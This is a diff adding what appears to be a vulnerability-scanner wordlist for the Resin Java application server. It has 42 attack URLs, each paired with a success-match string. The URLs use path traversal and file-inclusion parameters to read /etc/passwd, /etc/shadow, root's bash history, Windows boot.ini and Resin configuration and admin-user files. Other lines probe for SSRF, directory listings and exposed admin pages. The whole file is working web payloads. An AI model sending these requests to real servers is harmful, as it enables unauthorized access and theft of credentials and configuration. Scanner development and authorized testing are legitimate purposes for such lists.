@@ -1,0 +1,42 @@
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://127.0.0.1/?ssrf:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://www.baidu.com/?ssrf:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/shadow:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=C:\boot.ini:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/resin.conf:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/resin1.conf:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/resin-x4.conf:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/admin-users.xml:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/resin.xml:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/resin.properties:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../../../conf/admin-users.xml.generated:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bash_history:::back to demo
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bashrc_history:::back to demo
+/resin-doc/examples/jndi-appconfig/test?inputFile=/etc/passwd:::back to demo
+/resin-doc/examples/jndi-appconfig/test?inputFile=C:\boot.ini:::back to demo
+/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../conf/resin.conf:::back to demo
+/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd:::back to demo
+/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp:::&lt;
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsp:::&lt;
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=/etc/hosts:::localhost
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=/etc/passwd:::root:x
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=/etc/shadow:::root:
+/resin-doc/viewfile/?contextpath=/otherwebapp&servletpath=&file=WEB-INF/web.xml:::web-app
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/config.xml:::&lt;
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/resin-web.xml:::&lt;
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/web.xml:::web-app
+/resin-doc/viewfile/?contextpath=C:\&servletpath=&file=boot.ini:::boot loader
+/A:%5C/:::of /
+/B:%5C/:::of /
+/C:%5C/:::of /
+/D:%5C/:::of /
+/E:%5C/:::of /
+/F:%5C/:::of /
+/G:%5C/:::of /
+/H:%5C/:::of /
+/%20../WEB-INF/:::of /
+/%20../web-inf/:::of /
+/%3f.jsp:::of /
+/resin-admin/j_security_check?j_uri=status.php:::Admin
+/resin-admin/status.php:::Admin
+/resin-admin/login.php?target=/resin-admin/status.php:::Admin
